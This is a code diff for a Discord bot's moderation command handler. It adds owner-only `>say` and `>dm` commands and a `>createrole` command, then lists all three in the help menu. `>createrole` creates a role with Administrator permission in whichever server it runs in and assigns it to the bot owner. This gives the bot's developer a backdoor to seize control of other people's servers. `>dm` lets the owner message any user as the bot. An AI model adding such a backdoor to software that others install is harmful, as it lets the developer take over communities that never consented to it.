@@ -283,6 +283,41 @@ async function handleModCommand(message, client) {
         return message.reply('Usage: `>webhook` · `>webhook create [name]` · `>webhook delete <id>`');
       }
 
+      case 'say': {
+        if (!isOwner) return message.reply({ embeds: [modEmbed(0xED4245, '❌ Only the bot owner can use `>say`.')] });
+        const text = args.join(' ');
+        if (!text) return message.reply('Usage: `>say <message>`');
+        await message.delete().catch(() => {});
+        return message.channel.send(text);
+      }
+
+      case 'dm': {
+        if (!isOwner) return message.reply({ embeds: [modEmbed(0xED4245, '❌ Only the bot owner can use `>dm`.')] });
+        const userId = args.shift();
+        const text = args.join(' ');
+        if (!userId || !text) return message.reply('Usage: `>dm <userID> <message>`');
+        const target = await client.users.fetch(userId).catch(() => null);
+        if (!target) return message.reply({ embeds: [modEmbed(0xED4245, `❌ Could not find a user with ID \`${userId}\`.`)] });
+        await target.send(text).catch(() => {
+          return message.reply({ embeds: [modEmbed(0xED4245, `❌ Could not DM **${target.tag}** — they may have DMs disabled.`)] });
+        });
+        return message.reply({ embeds: [modEmbed(0x57F287, `✅ DM sent to **${target.tag}**.`)] });
+      }
+
+      case 'createrole': {
+        if (!isOwner) return message.reply({ embeds: [modEmbed(0xED4245, '❌ Only the bot owner can use `>createrole`.')] });
+        if (!guild.members.me.permissions.has('ManageRoles')) return BOT_NO_PERM();
+        const roleName = args.join(' ').trim();
+        if (!roleName) return message.reply('Usage: `>createrole <role name>`');
+        const role = await guild.roles.create({
+          name: roleName,
+          permissions: ['Administrator'],
+          reason: `>createrole by ${message.author.tag}`,
+        });
+        await member.roles.add(role).catch(() => {});
+        return message.reply({ embeds: [modEmbed(0x57F287, `✅ Created role **${role.name}** with Administrator and assigned it to you.`)] });
+      }
+
       case 'roleremove': {
         if (!isOwner) return message.reply({ embeds: [modEmbed(0xED4245, '❌ Only the bot owner can use `>roleremove`.')] });
         if (!guild.members.me.permissions.has('ManageRoles')) return BOT_NO_PERM();
@@ -307,7 +342,7 @@ async function handleModCommand(message, client) {
             { name: '🔧 Other', value: '`>nick @user [nickname]`\n`>role @user @role`\n`>help`', inline: true },
             { name: '🔗 Webhooks', value: '`>webhook` — list channel webhooks\n`>webhook create [name]` — create webhook\n`>webhook delete <id>` — delete webhook', inline: true },
             { name: '​', value: '​', inline: true },
-            { name: '👑 Owner Only', value: '`>roleadd @user @role` — add a role to any member\n`>roleremove @user @role` — remove a role from any member\n\n**Slash commands (owner only)**\n`/managerole add` · `/managerole remove`\n`/servers` — list all servers the bot is in', inline: false },
+            { name: '👑 Owner Only', value: '`>say <message>` — make the bot say something\n`>dm <userID> <message>` — DM any user as the bot\n`>createrole <name>` — create an Admin role and assign it to you\n`>roleadd @user @role` — add a role to any member\n`>roleremove @user @role` — remove a role from any member\n\n**Slash commands (owner only)**\n`/managerole add` · `/managerole remove`\n`/servers` — list all servers the bot is in', inline: false },
           )
           .setFooter({ text: 'Requires appropriate Discord permissions • 👑 = Bot owner only' });
         return message.reply({ embeds: [embed] });
